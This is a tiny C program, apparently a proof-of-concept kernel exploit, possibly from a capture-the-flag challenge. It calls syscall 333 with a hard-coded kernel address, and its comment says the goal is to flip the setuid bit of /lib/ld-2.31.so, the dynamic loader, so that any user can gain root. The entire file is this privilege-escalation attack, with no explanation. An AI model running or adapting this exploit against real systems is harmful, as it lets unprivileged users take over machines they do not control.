#include <unistd.h>
#include <stdio.h>

int main(void) {
    /* flip setuid bit of /lib/ld-2.31.so */
    long ret = syscall(333, 0xffff8800026db000ul, 11l);
    printf("ret: %ld\n", ret);
}
